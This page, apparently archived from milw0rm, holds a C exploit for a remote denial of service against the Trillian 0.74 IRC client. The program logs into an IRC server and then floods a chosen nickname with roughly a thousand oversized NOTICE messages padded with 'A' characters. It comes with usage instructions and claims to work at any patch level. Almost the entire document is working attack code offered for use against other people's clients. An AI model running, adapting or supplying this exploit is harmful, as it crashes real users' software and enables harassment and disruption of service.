<html><head><title>Trillian 0.74 Remote Denial of Service Exploit
</title></head><pre>/*

[--------------------------------------------]
[:::::::::::::::::: trillian 0.7*(d patch)   ]
[:::::Denial:of:Service::simple:exploit::]
[-----------------------------[l0bstah]-----]
[usage ::                                           ]
[      : trillah name attacked-nick          ]
[                                                       ]
[comment:: after patch .74d, exploits,  ]
[         wich use damage (~4095 data)  ]
[         not work, but this exploit           ]
[         work at any patch.                    ]
[                                                       ]
[P.S. irc specification include rull:          ]
[510 characters maximum allowed for   ]
[the command and its parameters...     ]
[that is why szBuf has 570 length...       ]
[--------------------------------------------]

*/

 #include &lt;winsock.h&gt;
 #include &lt;iostream.h&gt;
 #include &lt;stdio.h&gt;
 #include &lt;dos.h&gt;

 #define port    4384
 #define bfsize  540
 #define rptimes 1000

 WSADATA     wsadata;
 SOCKADDR_IN sa;
 SOCKET      s;
 LPHOSTENT   lpHostEntry;
 int         SockAddr = sizeof(struct sockaddr);
 int         i, ports;
 char        szBuf[570];          // [damage data] 
 char        nick[50];            // &lt;NICK&gt; command 
 char        user[50];            // &lt;USER&gt; command 
 char        mode[50];            // &lt;MODE&gt; command 
 char        *cname = &quot;trillah&quot;;  // your client name


int main(int argc, char **argv)
 {

   printf(&quot;::::::::::::::::::::::::::::::::::::\n&quot;);
   printf(&quot;: trillah - remote DoS exploit :::::\n&quot;);
   printf(&quot;:::::::::::::::::::::::::::[l0bstah]\n&quot;);

   if (argc &lt; 3) 
   { printf(&quot;use: trillah dnsname nick\n&quot;); return 0; }
   
   char *addr=argv[1];
   ports=port;

   if (WSAStartup(0x0101,&amp;wsadata) == 0)
   {

        lpHostEntry = gethostbyname(addr);

        sa.sin_family = AF_INET;
        sa.sin_addr = *((LPIN_ADDR)*lpHostEntry-&gt;h_addr_list);
        sa.sin_port = htons(ports);

        if ((s=socket(AF_INET,SOCK_STREAM,0)) == INVALID_SOCKET)
        {
        printf(&quot;Can't open socket! - #%d\n&quot;,WSAGetLastError());
        exit(0);
        }

        printf(&quot;connecting to irc server : %s...\n&quot;, addr);

        if (connect(s, (struct sockaddr*)&amp;sa, sizeof(sa)) == -1)
        {
        printf(&quot;Can't connect() - #%d\n&quot;,WSAGetLastError());
        exit(0);
        }       
        printf(&quot;connected... starting login session \n\n&quot;);

        //*** NICK &lt;NICK&gt;
        strcpy(nick, &quot;NICK &quot;);
        strcat(nick, cname);
        strcat(nick, &quot;\n&quot;);
        send(s,
                nick,
                strlen(nick),
                0);

        printf(nick);

        //*** USER &lt;mode&gt; &lt;unused&gt; &lt;realname&gt;
        strcpy(user, &quot;USER &quot;);
        strcat(user, cname);
        strcat(user, &quot; 0 127.0.0.1 : trilla\n&quot;);
        send(s,
                user,
                strlen(user),
                0);

        printf(user);

        sleep(1);

        //*** MODE &lt;nick&gt; (+|-*)
        strcpy(mode, &quot;MODE &quot;);
        strcat(mode, cname);
        strcat(mode, &quot; +i\n&quot;);
        send(s,
                mode,
                strlen(mode),
                0);

        sleep(2);

        //**********DAMAGE****DATA*************//

        printf(&quot;Sending damage data...\n&quot;);
        strcat(szBuf, &quot;NOTICE &quot;);
        strcat(szBuf, argv[2]);
        strcat(szBuf, &quot; :&quot;);
        for(i=0;i&lt;=bfsize;i++) strcat(szBuf,&quot;A&quot;);
        strcat(szBuf, &quot;\n&quot;);


        for (i=0;i&lt;=rptimes;i++)
        {

        send(s,
            szBuf,
            strlen(szBuf),
            0);
        }


        printf(&quot;attack complete....&quot;);

        //*************************************//

        closesocket(s);
        
        }

  WSACleanup();

}

// milw0rm.com [2003-08-01]</pre></html>